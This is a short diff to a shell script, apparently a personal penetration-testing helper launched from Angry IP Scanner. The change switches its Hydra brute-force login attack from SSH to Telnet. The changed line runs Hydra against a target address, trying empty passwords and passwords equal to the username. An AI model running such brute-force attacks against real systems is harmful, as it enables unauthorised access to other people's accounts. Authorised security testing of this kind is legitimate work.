@@ -3,10 +3,10 @@
 # Angry IP information -----------------------------------------------------------
 # | Angry Name                 | Execution String              | Run in Terminal | Directory |
 # | -------------------------- | ----------------------------- | --------------- | --------- |
-# | 22_SSH - HYDRA | THIS_FILE ${fetcher.ip} | TRUE            |           |
+# | 23_TELNET - HYDRA | THIS_FILE ${fetcher.ip} | TRUE            |           |
 
 # Script information -----------------------------------------------------------
-# | Script Name       : HYDRA_SSH.sh
+# | Script Name       : HYDRA_TELNET.sh
 # | Description       : Script for brute force hydra
 # | Directory         : ~/CYBER_TOOLS/SCRIPTS/
 # | Author            : Jordon Archer
@@ -86,7 +86,7 @@ fi
 
 # Hydra attack based on user input
 
-hydra $username_section $password_section $address ssh -e ns $verbose -I -t 4
+hydra $username_section $password_section $address telnet -e ns $verbose -I -t 4
 # ...
 
 echo -e "${RED}Hydra attack finished.${NC}"
